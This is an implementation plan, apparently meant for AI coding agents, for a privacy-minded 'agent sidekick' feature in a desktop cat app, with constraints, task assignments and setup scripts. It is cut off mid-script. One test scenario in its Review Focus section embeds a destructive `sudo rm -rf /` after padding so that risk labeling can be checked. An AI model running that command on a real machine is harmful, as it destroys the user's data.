# F1-tauri The Agent Sidekick Implementation Plan (Windows and Linux)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** The Windows/Linux Tauri app gets sub-project F1, the agent sidekick: the cats are useful, not only cute. They give a short **recap** when the user comes back after being away and an agent did something; a fixed **plain line and, on a high risk, an orange badge** under each permission request (with the existing `surprised` emote); a **nudge** when an agent looks stuck (the same step four times, three errors in a row, a request nobody answered, an agent gone quiet); an **answer to "What's Claude doing?"** in the chat that never leaves this computer; and a **drop of a file on an agent's own cat** that copies the path and brings the agent's project forward, honestly and without pasting. A model that runs on this computer may offer a nicer sentence for a note; nothing else ever may. Everything is memory only, capped, never logged, and the permission line only labels: it never allows, denies or blocks.

**Architecture:** The rules are written once: `shared/sidekick-core.js` (F1-0, merged), replayed by every port against `tests/fixtures/sidekick/`. **This app does not hand-port them**: `scripts/gen-sidekick-ts.mjs` copies the source into `windows/src/sidekick/core.generated.ts` (the way `gen-theme.mjs` writes the theme), `src/sidekick/core.ts` types it, and `npm run check:sidekick` replays all ten fixture files against that copy and fails if it is stale (the owner's answer). Beside it, small modules of this plan's own, all pure and loaded by plain Node with a fake clock, timer, world and model: `ledger.ts` (the memory-only ledger), `presence.ts` (away and back), `notes.ts` with `world.ts` (the show gate and the held notes), `stuckclock.ts` (the one one-shot timer), `explain.ts` (the permission line, with the relay's 2000-byte cut read as "unsure"), `statuschat.ts` (the chat's local answer), `agentdrop.ts` (the drop rules), `voice.ts` (the local wording) and `controller.ts`, the `Sidekick` class that composes them and that `main.ts` installs through `hub.ts`. `appenv.ts` is the one file that meets Tauri. Rust adds `sidekick_settings.rs` (the clean-up of the `sidekick` object of `settings.json`, kept at every save), `sidekick_presence.rs` and `sidekick.rs` (the lock, sleep and display news to the island's page, and the idle time), `ai/oneshot.rs` with `ai_oneshot` and `ai_local_model` (only a model on this computer), `copy_text` (the clipboard, never a paste) and two lines of the relay.

**Tech Stack:** TypeScript 5 and Vite 6 (already in `windows/`), Node 22 (`node --test` reading the TypeScript source with `--experimental-strip-types`), Rust with `serde_json`, Tauri 2, `reqwest` and the `windows` crate (all already there), `playwright-cli` (headless Chromium, for the pictures only). **No new npm or cargo dependency, no change to `Cargo.lock`; the one change to `Cargo.toml` is two more features of the `windows` crate (Task 10; the owner's answer).**

**Spec:** `docs/superpowers/specs/2026-10-14-agent-sidekick-design.md` (F1), its contract `docs/SIDEKICK-CONTRACT.md` (F1-0), `shared/sidekick-core.js` and `tests/fixtures/sidekick/`. The research behind the spec is in the F1 research notes of the main session (`f1-research/findings.md`). The format and the conventions are the last Windows plan's, `docs/superpowers/plans/2026-10-12-h-tauri-desktop-cat.md`. The Mac twin (F1-mac) is drafted at the same time; "Parity with macOS" below says what differs. Read `windows/src/island/hooks.ts`, `core/state.ts`, `island/island.ts`, `views/views.ts`, `views/chat.ts`, `src-tauri/src/lib.rs`, `settings.rs`, `platform/` and `windows/README.md` first.

**Base:** branch `f1/tauri-sidekick`, in a git worktree, from `notchmeow/rebrand` **at `a5d9066` or later** (F1-0 is merged, and so are the Mac's all-terminals round and G1-mac, neither of which touches `windows/`: nothing of the F1-0 plan is applied by this plan; the Setup block checks `git merge-base --is-ancestor a5d9066 HEAD`). Nothing is pushed.

## Global Constraints

Every task's requirements include this section. Values are copied from the spec and the contract; a line marked "(plan decision)" is a choice this plan makes where the spec is silent, and is listed again under "The owner's answers".

- **Frozen IDs and words.** The five dismissal kinds `recap`, `stuck.loop`, `stuck.errors`, `stuck.waiting`, `stuck.silent` and every reason ID of the contract are frozen like the cat and pill IDs. Pill IDs, cat IDs, display mode IDs and the contract strings (`nm-hook`, `nm.sock`, `notchmeow-hook`, `nm_kind`, `nm_agent`) are never renamed.
- **The sidekick labels and remembers. It never blocks, allows or denies anything.** Only the user's click answers a request. "Never approve without a click" is untouched: nothing here calls `approvalDecision`, `approvalDecline` or `approvalAck`.
- **What the sidekick never keeps** (contract): the prompt, the assistant's text, `transcript_path`, a tool's output, a command, a full path, a file's content. Events and the ledger hold a **basename**, a **command key** (a hash) and counts; a name keeps no control or invisible character; an event with no session ID is filed under `unknown`. Every line the rules write holds a basename, a count, an agent's name or a number of minutes, and nothing else. The ledger is **memory only**, capped (8 sessions, 40 ring entries each, 30 minutes after `SessionEnd` or 12 hours after the last event), **never written to disk and never logged**. Tests plant a marker in each of those inputs and assert it never comes out (Task 13).
- **Fed before the gate.** `island/hooks.ts` feeds the ledger after a chat's own Claude Code run is set aside and **before** anything can refuse the event (the one-card gate that declines a second request, the decline of an external agent's request).
- **Timing (spec).** Task boundaries only. A recap on return, at most one per away period, and not for an absence under 2 minutes or when nothing happened. A stuck nudge at most once per session. A refused note is kept 30 s (a nudge) or 2 minutes (a recap) and shown if the gate opens, then dropped silently. **A nudge counts as given only once it was shown** (a dropped one may come again for a new event). **A nudge that fell due while the user was away is dropped, not saved for later** (the recap covers it). **A recap past three rows is cut with "…"** (the contract's "+N more" row is shown as that). Shown **only in the island, through its existing peek** (`island.alert`, the way a finished task shows), never pinned, never over a card or the chat the user is working in.
- **Dismissal.** A click on Not now, OK or × counts; folding the island unseen does not. After 2 a kind is muted; Settings has an Unmute; **the risk badge and the permission line are never muted** and have no switch.
- **Away.** A lock or a switch to another user (the owner's answer: lock and user-switch are away), a sleep (Linux), the display off (Windows), or 300 s of no input (Windows `GetLastInputInfo`; Linux only where GNOME's idle monitor is there). Idle is read **only** when a hook event comes (at most every 5 s), when the island opens and on an unlock/wake/display-on, and only while an agent is running or the user is away. **No new polling**: no `setInterval`, no thread, no loop in any new file; the one timer is the stuck clock's, set to the nearest deadline and **not set at all while nothing is live**. The hidden island still costs 0 % CPU.
- **The permission card stays exactly as it ships.** The only additions: one grey 11 px line (`#8E939C`, one line, ellipsis) between the command and the buttons, an orange "High risk" capsule at the trailing edge of the "who" row on a high risk only, and the existing `surprised` emote once on a high risk (not when the desktop cat is out: its alert emote is that one). The 160 px card must still fit (Task 8 measures). The button row is not rebuilt by the new code. Deny, Allow, the 110 s limit and the Codex rule are untouched. No new emote, no new cat state.
- **"What's Claude doing?" is answered on this computer, never added to a conversation.** `matchStatusQuestion` is the contract's: only a whole short message. The card is in `State.localAnswers`, not in `State.chatHistory`, and is checked before any model, setting, file or conversation is touched.
- **Drop on an agent's cat (the owner's answer, 2026-10-14).** While a file is dragged over the island, **small chips for each running agent** (Claude Code, Gemini CLI, Antigravity, any other tagged agent: a live session in the ledger and a pill on the island, at most four) appear on the drop view, in every display mode, as **an additive strip that floats over the drop view and does not move it** (absolute, no mouse of its own, shown only while a file is dragged). A drop on a chip: the file's **original path** goes to the clipboard (one path plain; several, one per line, no quotes), the agent's project is brought forward by the existing "Open terminal" action on Windows (VS Code on the project folder, or the folder), **nothing is opened on Linux** (the path is copied only), the agent's cat is happy, and the line says **"Copied the path — paste it into {Agent}"** (or "Couldn't copy the path."). **The big drop area (the chat or Ask drop, and G1's future Ask and Shelf halves) is exactly as it ships** and is never a chip. NotchMeow never pastes, types or sends a key to another app, never runs `claude --resume`, never says "sent", "delivered" or "attached".
- **The local voice.** A model on `127.0.0.1`, `::1` or `localhost` only (`Placement::Local`; never a network or cloud provider, never the chat's Auto choice, never a new `AIFeature`); one request, no history, no key read, nothing stored or logged; given only the allowed facts of a note (an agent's name, a project's basename, counts, up to three file basenames, the state words); the template is always shown first; the sentence must pass the contract's `acceptNicerLine`, arrives within 6 s, and crossfades in once if the pointer is not over the note. A permission line is never reworded.
- **Storage.** The `sidekick` object `{on, local, dismissals}` of `settings.json`, cleaned by `cleanSidekickSettings` in the page and `clean_sidekick` in Rust (both replay `settings-cases.json`), kept by `settings::sanitized` at every save. Not stored: the ledger, the presence state, the nudged set, any note.
- **Platforms.** Windows and Linux only here; **there is no Codex on Windows or Linux** (no hooks) and no Apple on-device model. The relay cuts every string at 2000 bytes: a cut command or path is at least "unsure". The relay drops `tool_response`, `transcript_path` and (new) `last_assistant_message` and `prompt_response`.
- **Never restyle what ships.** New views and rows are built from the existing classes; the new CSS rules are new class names only (`.sk-*`, `#agent-drops`, `.ad-*`). Settings gets a new section.
- **Files loaded by `npm run check:sidekick`** (everything under `windows/src/sidekick/` except `appenv.ts`, plus `core/layout.ts`, `core/state.ts` and the cat modules they import) use erasable TypeScript only (no `enum`, no `namespace`, no constructor parameter properties), `import type` for types, and relative imports **with the `.ts` extension**. Files outside that set (`appenv.ts`, `dev.ts`, `island/`, `views/`, `settings/`, `main.ts`, `core/bridge.ts`) keep the repo's extension-less imports.
- **No new dependency.** No `npm install`, **no change to `Cargo.lock`**. Rust runs **only** through `windows/scripts/cargo-linux.sh` (Docker Desktop running), with this plan's own target directory: `windows/scripts/cargo-linux.sh test --workspace --target-dir /repo/windows/target/f1-tauri`.
- **No telemetry, no Coucou or Mochi names** (`names.test.mjs` keeps guarding `windows/`), **no log of anything the sidekick is told**.
- **Commits:** local only, never pushed, via `git commit -F -` with the message on stdin. End every commit message with the line `Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>` for a task a Haiku agent ran, or `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>` for a Sonnet one (Tasks 5 and 10, and any task handed to `nm-implementer-deep`).
- **The model rule** (`CLAUDE.md`, "Working with AI agents"): Haiku 5.5 first, Sonnet 5.5 only on a named trigger, never Opus or Fable. The controller runs on **Haiku 5.5 at high effort**. Tasks 5 and 10 use `nm-implementer-deep` for **trigger 1** (operating-system APIs: `GetLastInputInfo`, the session and display notifications, logind and GNOME's idle monitor, the Win32 and GTK clipboards); the whole branch goes to `nm-reviewer-deep` (trigger 4: a privacy review).
- **House rules for every session and every subagent brief (the SUBAGENT RULES block):**
  1. **Never launch, quit or replace any NotchMeow app, and never start the Tauri app** (`npm run tauri dev`, a built `notchmeow.exe`): the owner runs it. Serving the front end with `npx --no-install vite` and looking at it in the headless `playwright-cli` browser is allowed, and only that. **Never run the real `claude`**, and never read `~/.claude`, a credential or a transcript: the tests use fakes and fixtures only.
  2. **Install nothing and download nothing.** `npx --no-install` only; never `npm install`, `npm ci`, `npm run build`, `npm run dev` or `npm run tauri`.
  3. **Rust only through `windows/scripts/cargo-linux.sh`** with `--target-dir /repo/windows/target/f1-tauri`. Check the image first: `docker image inspect notchmeow-linux-dev`. **Never build or pull the image** (the script would, if it is missing): if the image is missing or the daemon is down, **the step stops and the session reports it**; the TypeScript tasks go on, and the Rust steps are owed.
  4. **Use `trash` on literal paths only, never `rm -rf`.** Pictures and the one-off scripts go in `.claude/checkpoints/f1-tauri/` (gitignored), never anywhere that git tracks. Stop the dev server **by its saved PID only** (`kill "$(cat .claude/checkpoints/f1-tauri/vite.pid)"`), never `kill $(lsof ...)`; close every browser session **by its name** (`playwright-cli -s=<name> close`), never `close-all`. Run `playwright-cli` with the default `TMPDIR`, from `.claude/checkpoints/f1-tauri/`.
  5. **Never push.** Commit only in a task's commit step, with `git commit -F -`, after `git rev-parse --show-toplevel` and `git branch --show-current` have said that the session is in its worktree on `f1/tauri-sidekick`. Edit `CLAUDE.md` and `ARCHITECT.md` only where Task 14 says so.
  6. **If a command is denied by a permission prompt, stop and report it.** Do not look for a workaround. **If a "find" text of an edit script is not found exactly once, stop and report: the tree is not what the plan expects.**
  7. Every shell block of this plan passes `bash -n`; a block that a brief edits must still pass it. Never use `sed -i` (it differs between macOS and Linux): edits are the plan's Python scripts.

## Review Focus

The spec says what the sidekick must do. It is silent on these inputs, and each would bite a person first. Each line names its test.

1. **A command or path the Windows relay cut.** A long command arrives without its end (2000 bytes and "…"): `ls` followed by 2000 characters and then `; sudo rm -rf /`, which the rules read as low. Expected: at least "unsure" (medium), never low; a command that is already medium or high stays so; a cut file body does not matter to the label. Tests: Task 8 (`explain.test.mjs`, "a command or path the relay cut…").
2. **A hand-edited or half-written `sidekick` object, and the next save.** `on` as `"false"` or `0`, `dismissals` as text, a count of 7 or -1 or 1.5, an unknown kind, cut-off JSON; then Settings saves. Expected: the app starts, the rest of the file is kept, no `settings.json.bad-…` appears, the object is cleaned and **still there after the save** (a save that only knew other settings must not drop it). Tests: Task 2 (`the_sidekick_settings_survive_a_save…`, `one_bad_field_in_the_sidekick_object…`, `settings.test.mjs`).
3. **Away and back with lazy sampling.** A lock and an unlock in a hurry; a long idle that only a later hook event notices; a lock together with idle; two returns in a row; the machine asleep when a one-shot timer was due. Expected: one recap per away period, counted from the real time away (the OS's last-input time), none under 2 minutes, none when nothing happened; the rules are asked again at once on a wake or an unlock. Tests: Task 5 (`presence.test.mjs`, the fuzz), Task 6 (`notes.test.mjs`, the recap), Task 7 (`stuck.test.mjs`, "away, a rate limit and the switch").
4. **A note against a card, the chat, and the past.** A nudge due while an approval is on screen or the user is typing; a card that hides 40 s later; a quiet nudge for an agent that has since spoken; a recap and a nudge together; the island folded away unseen. Expected: nothing covers a card or the user's work; a held note shows when the gate opens and is forgotten when it is no longer true or has waited 30 s (a recap 2 minutes); the recap goes first; folding unseen is not a dismissal and a click is. Tests: Task 6 (`notes.test.mjs`), Task 7 (`stuck.test.mjs`, "a nudge that waited…").
5. **A drop with odd paths and off the chips.** Several files, a path with a space, a path with a line break, an empty drop, a drop a little off a chip, a drop on the big cat or on empty island, a drop while no agent has a cat. Expected: one path plain, several one per line with no quotes, a path that could not be told from the next left out, nothing on the clipboard from the big cat's drop, and the chat/Ask drop exactly as it was everywhere else. Tests: Task 10 (`agentdrop.test.mjs`), Task 11 (the wiring pins).

---

## File Structure

All paths are under `windows/` unless they say otherwise.

| Path | Responsibility |
|---|---|
| `../scripts/gen-sidekick-ts.mjs`, `src/sidekick/core.generated.ts`, `src/sidekick/core.ts` | New. The generator, the copy of `shared/sidekick-core.js` it writes (never edited), and the types. |
| `scripts/sidekick-tests/*.test.mjs`, `util.mjs`, `package.json` | New: `fixtures`, `fresh`, `settings`, `ledger`, `presence`, `notes`, `stuck`, `explain`, `status`, `agentdrop`, `voice`, `leak`, `dev`. `npm run check:sidekick`. |
| `src/sidekick/ledger.ts`, `hub.ts`, `platform.ts`, `controller.ts` | New. The memory-only ledger; the one place the island's other modules find the Sidekick; which system this is; the `Sidekick` class. |
| `src/sidekick/presence.ts`, `notes.ts`, `world.ts`, `stuckclock.ts` | New. Away and back with lazy idle sampling; the show gate, held notes and dismissals; what the gate asks of the island; the one one-shot timer. |
| `src/sidekick/explain.ts`, `statuschat.ts`, `agentdrop.ts`, `voice.ts`, `settings.ts`, `dev.ts` | New. The permission line; the chat's local answer; the drop rules; the local wording; the settings helpers; the dev server's scripted runs. |
| `src/sidekick/appenv.ts` | New. The one file that meets Tauri: the clock, the settings, the world, the island's peek, the three Rust calls. |
| `src/views/agentdrop.ts`, `src/views/views.ts`, `src/views/chat.ts`, `src/style.css` | New and changed. The strip of agent cats; the `sidekick` view and the card's line and badge; the status chip and the local card; the new classes. |
| `src/island/hooks.ts`, `src/island/island.ts`, `src/core/state.ts`, `src/core/layout.ts`, `src/core/bridge.ts`, `src/cat/minibots.ts`, `src/main.ts` | Changed. The feed, the explanation and the emote; the peek, the drop, the hover; `Settings.sidekick`, `ApprovalInfo`, `sidekickNote`, `localAnswers`; the `sidekick` view's height; four calls and one event; a mini cat's emote; the installation. |
| `src/settings/sidekick.ts`, `src/settings/main.ts` | New and changed. Settings → Sidekick. |
| `src-tauri/src/sidekick_settings.rs`, `sidekick_presence.rs`, `sidekick.rs` | New. The `sidekick` object's clean-up; the pure signal words, idle arithmetic and clipboard check; the away news and the idle command. |
| `src-tauri/src/ai/oneshot.rs`, `ai/mod.rs`, `ai/session.rs` | New and changed. The pure part of the local voice; `ai_oneshot`, `ai_local_model`; `rediscover` is `pub(crate)`. |
| `src-tauri/src/lib.rs`, `settings.rs`, `platform/windows.rs`, `platform/linux.rs`, `Cargo.toml` | Changed. The registrations, `BootInfo.home`, `copy_text`; the object kept at every save; `idle_seconds` and `copy_text`; two `windows` features. |
| `hook/src/main.rs`, `scripts/cat-tests/kitten-wiring.test.mjs` | Changed. Two more dropped fields, and the old pin that listed them. |
| `README.md`, `../CLAUDE.md`, `../ARCHITECT.md`, `../.github/workflows/windows-tests.yml` | Changed, in Tasks 1 and 14. |

**Staged edits.** Most tasks edit files earlier tasks created or changed. Every edit below is a Python script whose `edit` helper asserts that the find text occurs exactly once; the text is what the tree has after the tasks before it. Run each script from the repository root, as it is. If a find text occurs zero or two times, stop and report: the tree is not what the plan expects.

## Tasks and agents

`CLAUDE.md`: Haiku 5.5 first, Sonnet 5.5 only on a named trigger. Tasks 1, 3, 13 and 14 give every line of their code: transcription, `nm-implementer-light` (Haiku 5.5, medium). Tasks 2, 4, 6, 7, 8, 9, 11 and 12 are multi-file with their code given: `nm-implementer` (Haiku 5.5, high). **Tasks 5 and 10 are `nm-implementer-deep` (Sonnet 5.5, high), trigger 1**: Task 5 reads the operating system's idea of "away" (the Windows lock and display notifications, `GetLastInputInfo`, logind, GNOME's idle monitor) and adds a second reader to a watcher that takes one callback; Task 10 writes the Win32 and GTK clipboards. Each task is then reviewed by `nm-reviewer` (Haiku 5.5, high), and the whole branch by `nm-reviewer-deep` (Sonnet 5.5, high) after Checkpoint 3, with the privacy review in its brief. If a step's expected output differs and the cause is not obvious (a Rust compile error, a layout that overlaps, a drop that does not reach the island), hand that task to `nm-implementer-deep` (trigger 2); a task Haiku has failed twice goes there too.

| # | Task | Agent | Model | Review |
|---|---|---|---|---|
| 1 | The contract's rules in TypeScript: the generator, the typed copy, the replay of all ten fixtures, CI | `nm-implementer-light` | Haiku 5.5 | `nm-reviewer` |
| 2 | The `sidekick` settings: TypeScript helpers, the Rust twin kept at every save, Settings → Sidekick | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 3 | What the relay forwards: no assistant text | `nm-implementer-light` | Haiku 5.5 | `nm-reviewer` |
| 4 | The ledger, fed before the gate | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 5 | Away and back: the platform's news, the idle time and lazy sampling | `nm-implementer-deep` (trigger 1) | Sonnet 5.5 | `nm-reviewer` |
| 6 | Notes: the gate, held notes, dismissals, the `sidekick` view and the recap | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 7 | Stuck nudges: the one-shot clock, the four rules and the dev server's scripted runs | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 8 | The permission line, the badge and the surprised emote | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| | **Checkpoint 1:** pictures of the Settings section, the card at each risk, a recap and a nudge | the executing session | | |
| 9 | "What's Claude doing?" in the chat | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| | **Checkpoint 2:** a scripted run (recap, nudge, status) as pictures | the executing session | | |
| 10 | Drop on an agent's cat, the rules and the clipboard (Rust) | `nm-implementer-deep` (trigger 1) | Sonnet 5.5 | `nm-reviewer` |
| 11 | Drop on an agent's cat, the island: the strip, the hand-over, the line | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 12 | The local voice: `ai_oneshot`, `ai_local_model` and the swap | `nm-implementer` | Haiku 5.5 | `nm-reviewer` |
| 13 | The leak test, the cpu rules and the gate pins | `nm-implementer-light` | Haiku 5.5 | `nm-reviewer` |
| 14 | The docs and the final checks | `nm-implementer-light` | Haiku 5.5 | `nm-reviewer` |
| | **Checkpoint 3:** the owner's real-build checks, then sign-off | the executing session | | |
| Final | Whole-branch review, privacy review included | `nm-reviewer-deep` (trigger 4) | Sonnet 5.5 | none |

Coding agents load `ponytail:ponytail`, `superpowers:test-driven-development` and `superpowers:verification-before-completion`; `nm-implementer-deep` also `superpowers:systematic-debugging`. Reviewers load `ponytail:ponytail-review` (the deep reviewer also `superpowers:requesting-code-review`). Ponytail never cuts what this plan or the spec asks for, nor tests, security or privacy rules. The agents of Tasks 2, 6, 7, 8, 9 and 11 also load `playwright-cli`.

## Execution

**One worktree chat session** runs the whole plan: branch `f1/tauri-sidekick`, model **Haiku 5.5 at high effort** (the controller's own work is to dispatch, run the commands and keep the ledger; the platform work is in the two `nm-implementer-deep` tasks), in parallel with the Mac twin, which has its own worktree. It runs on a base where **F1-0 is merged** (`a5d9066` on `notchmeow/rebrand`, or any later commit). Nothing is pushed. The session never starts the Tauri app: the owner's real-build checks are listed at the end.

**The session is started in three steps** (`ARCHITECT.md`), because a chip's first turn runs on the app's default model and a model change applies only from a session's next turn:

1. **Setup and stop.** The chip's prompt only sets up:

   > Run the Setup block of `docs/superpowers/plans/2026-10-14-f1-tauri-sidekick.md`. If any check in it fails, say so and stop. Read `CLAUDE.md`, `ARCHITECT.md`, `windows/README.md`, that plan and `docs/superpowers/specs/2026-10-14-agent-sidekick-design.md`. Reply "ready" and stop. Do not start any task.

2. **Model.** Once the owner starts the chip, the main session sets that session to Haiku 5.5 at high effort (`set_session_model`, `set_session_effort`).
3. **Brief.** The main session then sends the controller brief below as the next message.

Before any follow-up turn, the main session checks the session is still on its configured model and effort.

**Controller brief** (what the main session sends the worktree session once its model is set):

> Run `docs/superpowers/plans/2026-10-14-f1-tauri-sidekick.md` with `superpowers:subagent-driven-development`, task by task, on branch `f1/tauri-sidekick`. Do its Setup first. Dispatch each task to the agent and model the plan's "Tasks and agents" table names, then to `nm-reviewer`; fix what the review finds before the next task. `nm-implementer` for each multi-file task, `nm-implementer-light` for the tasks whose code is given in full, `nm-implementer-deep` **only** for the two tasks that name trigger 1 (Task 5, the away sink and the idle readers; Task 10, the clipboards: operating-system APIs) or when a task fails twice; `nm-reviewer-deep` at the end, privacy review included (trigger 4). Never Opus or Fable. These rules hold for you and for every brief you write:
>
> 1. **Where you are.** Before every commit run `git rev-parse --show-toplevel` and `git branch --show-current`: the first must be this session's worktree and the second `f1/tauri-sidekick`. If either differs, stop and report. Commit once per task with `git commit -F -`, the message on stdin, ending with the `Co-Authored-By` line of the model that did the task. **Never push.**
> 2. **The ledger.** Keep a manual ledger at `.superpowers/sdd/2026-10-14-f1-tauri-sidekick/progress.md` (the SDD plugin's scripts are refused by auto mode): one line per task with its status, its commit, the test counts it printed, the model and agent that ran it, the trigger if it was `nm-implementer-deep`, and what the review found and how it was fixed. Write it after every step that changes a status.
> 3. **Briefs are task-sized.** A subagent gets one task: its text from the plan, the Global Constraints, the SUBAGENT RULES block, the files to read and the exact commands. Never hand it the whole plan.
> 4. **Reviews** read `git diff notchmeow/rebrand...HEAD` (three dots) restricted to the task's files, never two-dot, and the task's own text.
> 5. **Shell.** Every shell block you write or edit passes `bash -n` first. Stop the dev server by its saved PID only (`kill "$(cat .claude/checkpoints/f1-tauri/vite.pid)"`), never `kill $(lsof ...)`. Close `playwright-cli` browsers by session name (`-s=<name> close`), never `close-all`. Run `playwright-cli` with the default `TMPDIR`, from `.claude/checkpoints/f1-tauri/`. Use `trash` on literal paths only.
> 6. **Never** launch, quit or replace a NotchMeow app or start the Tauri app; run the real `claude`; read `~/.claude`, a credential or a transcript; install, download or build a Docker image (if `docker image inspect notchmeow-linux-dev` fails or the daemon is down, say so: the Rust steps are owed, and the TypeScript tasks go on); use the network; or use `rm -rf`. Rust only through `windows/scripts/cargo-linux.sh` with `--target-dir /repo/windows/target/f1-tauri`.
> 7. **Refusals and failed finds.** If any command is refused by a permission prompt, stop and report it. If a find text of an edit script is not found exactly once, stop and report it: do not look for another way.
> 8. **Checkpoints.** Run Tasks 1 to 8, then stop for **Checkpoint 1**: copy the pictures into `.claude/checkpoints/f1-tauri/` (the list under the checkpoint), send the owner their paths and the list, and wait. After the owner's reply run Task 9 and stop for **Checkpoint 2**. After the owner's reply run Tasks 10 to 14 and stop for **Checkpoint 3** (the owner's real-build checks); after the owner's OK dispatch `nm-reviewer-deep` over the whole branch. Never start the next stage before the owner's reply.
> 9. **Ping the main session.** At each checkpoint, at the end and **whenever you stop for any reason**, send a message with `SendMessage` addressed to the main session by its `ListAgents` name, `NotchMeow — fork research & cat design`: the commits so far, the test counts, what is owed and what you need. Never wait silently.
> 10. **Report:** the commits; for `windows/`: `npx --no-install tsc --noEmit`, `npm run check:cat`, `npm run check:ai`, `npm run check:claude`, `npm run check:sidekick` and the `cargo test --workspace` counts (or that the image was missing); the output of `bash scripts/test-sidekick-contract.sh`; the pictures of the three checkpoints; the Windows `cargo check` and a release build (owed to CI); and anything you could not settle.

## Setup (the controller, once)

- [ ] Put the session's worktree on the plan's branch, check that F1-0 is merged (`a5d9066` is an ancestor of `HEAD`), check that the base has what the plan reads, and copy the main checkout's front-end packages. This plan adds no package, so nothing is downloaded: no `npm install` or `npm ci`. `cp -c` makes an APFS clone, which is instant and takes no extra disk space. It must be a real folder, not a symlink, because `.gitignore` ignores `/windows/node_modules` as a folder.

```bash
git status                                   # must be clean
git switch -c f1/tauri-sidekick notchmeow/rebrand
git merge-base --is-ancestor a5d9066 HEAD && echo "F1-0 is merged (a5d9066)"   # if this prints nothing, stop
git log --oneline -3
git ls-files shared/sidekick-core.js tests/fixtures/sidekick/hook-cases.json docs/SIDEKICK-CONTRACT.md docs/superpowers/plans/2026-10-14-f1-tauri-sidekick.md
git rev-parse --show-toplevel; git branch --show-current
cp -cR "/path/to/notchmeow/windows/node_modules" windows/node_modules
git status --short                           # still empty: the copy is ignored
mkdir -p .claude/checkpoints/f1-tauri .superpowers/sdd/2026-10-14-f1-tauri-sidekick
( cd windows && node --version )             # 22.6 or newer
```

Expected: `F1-0 is merged (a5d9066)`.

`F1-0 is merged (a5d9066)` must print, and so must the four paths (if the fixture is missing F1-0 is not merged: stop; if the plan's own path prints nothing, the plan is not committed on this branch: stop).

- [ ] Check that the contract is the one this plan was written against: the thresholds, the five kinds and the reasons that the app's code and tests copy must be the core's.

```bash
node -e '
const core = require("./shared/sidekick-core.js"), assert = require("node:assert/strict");
const json = (v) => JSON.parse(JSON.stringify(v));
assert.deepEqual(core.DISMISS_KINDS, ["recap", "stuck.loop", "stuck.errors", "stuck.waiting", "stuck.silent"]);
assert.equal(core.MUTE_AT, 2);
assert.deepEqual(json(core.STUCK.GIVE_UP_MS), { mac: 115000, windows: 110000, linux: 110000 });
assert.deepEqual(json(core.HOLD_MS), { nudge: 30000, recap: 120000 });
assert.deepEqual(json(core.IDLE), { AWAY_S: 300, BACK_S: 3 });
assert.equal(core.RECAP.MIN_AWAY_MS, 120000);
assert.equal(core.REASONS.length, 30);
assert.equal(core.REASONS.find((r) => r.id === "unsure").risk, "medium");
console.log("the contract is the one this plan was written against");
' 
```

Expected: `the contract is the one this plan was written against`.

If an assertion fails, stop and tell the main session which number differs.

- [ ] Check that the starting point is green.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
( cd windows && npm run check:ai 2>&1 | tail -1; npm run check:claude 2>&1 | tail -1 )
bash scripts/test-sidekick-contract.sh 2>&1 | grep -E "^# (tests|pass|fail)|✓ 10 fixture files|✓ two generator"
docker image inspect notchmeow-linux-dev >/dev/null 2>&1 && echo "image ok" || echo "image missing or the daemon is down: the Rust steps are owed"
```

Expected: `tsc exit 0`, `ℹ tests 372`, `ℹ pass 372`, `ℹ fail 0`, `All AI UI checks passed`, `All Claude Code UI checks passed`, `✓ 10 fixture files match sidekick-core.js`, `✓ two generator runs write identical bytes`.

(The last line prints `image ok` when Docker is up; if it does not, **do not build the image**: do the TypeScript tasks only and report that the Rust steps (Tasks 2, 3, 5, 10 and 12) are owed. Their code is complete either way, and CI's `windows-tests.yml` runs `cargo test`.)

## How to run this plan

**Blocks.** A code step is a `bash` block: either a file written with `cat > path <<'EOF'` (the file's exact content, from the repository root), or a Python script whose `edit` helper replaces text that must occur exactly once in the file it names, or a plain command. Run each block from the repository root, as it is. Never type a block from memory and never "improve" one. A `Run:` block's `Expected:` line says what it prints (every backticked literal must appear); `Expected (a failure, exit non-zero)` says the step is red on purpose. A command that starts with `( cd windows && …)` runs in a subshell and leaves the shell where it was.

**Red first.** Each task writes its tests, runs them to see them fail, writes the code, and runs them to see them pass. A "prove it bites" step changes one line with the given script, runs the tests, and puts the line back (the script restores the file itself): it is never committed.

**Pixels.** There are no pixel tests. The look is checked by eye in a headless browser (`playwright-cli`, with Vite alone, never the Tauri app) and the cost by the tests' own counters. Keep every picture in `.claude/checkpoints/f1-tauri/`, and say what you saw. **What no test program and no headless browser can show** is what the owner's real-build checks at the end are for (a lock screen, a drop from the real file manager, a clipboard, a model on this computer); never claim them.

**The owner's checkpoints** are marked `Checkpoint N`: the session stops there, sends the owner the pictures and the list, and waits.

**Starting and stopping the dev server** (Tasks 2, 6, 7, 8, 9 and 11 use it; port 14711 so that it never meets another worktree's):

```bash
mkdir -p .claude/checkpoints/f1-tauri
cd windows
(npx --no-install vite --port 14711 --strictPort > ../.claude/checkpoints/f1-tauri/vite.log 2>&1 & echo $! > ../.claude/checkpoints/f1-tauri/vite.pid)
sleep 3
cd ..
tail -3 .claude/checkpoints/f1-tauri/vite.log
```

Expected: `VITE v6`, `http://127.0.0.1:14711/`.

When a task is done with it: `kill "$(cat .claude/checkpoints/f1-tauri/vite.pid)"` (nothing else) and, for each session it opened, `playwright-cli -s=f1 close` (the pictures' session is named `f1`).

**One picture** (the same lines every time; `$1` is the page, `$2` the script that runs in it, `$3` the file name):

```bash
cat > .claude/checkpoints/f1-tauri/shot.sh <<'EOF'
#!/bin/bash
# usage, from .claude/checkpoints/f1-tauri/: bash shot.sh "<path and query>" "<script run in the page>" <picture name>
playwright-cli -s=f1 goto "http://127.0.0.1:14711/$1" > /dev/null
sleep 3.5
playwright-cli -s=f1 eval "(async()=>{ $2; await new Promise(r=>setTimeout(r,1500)); return window.__nm.State.view })()" | sed -n 2p
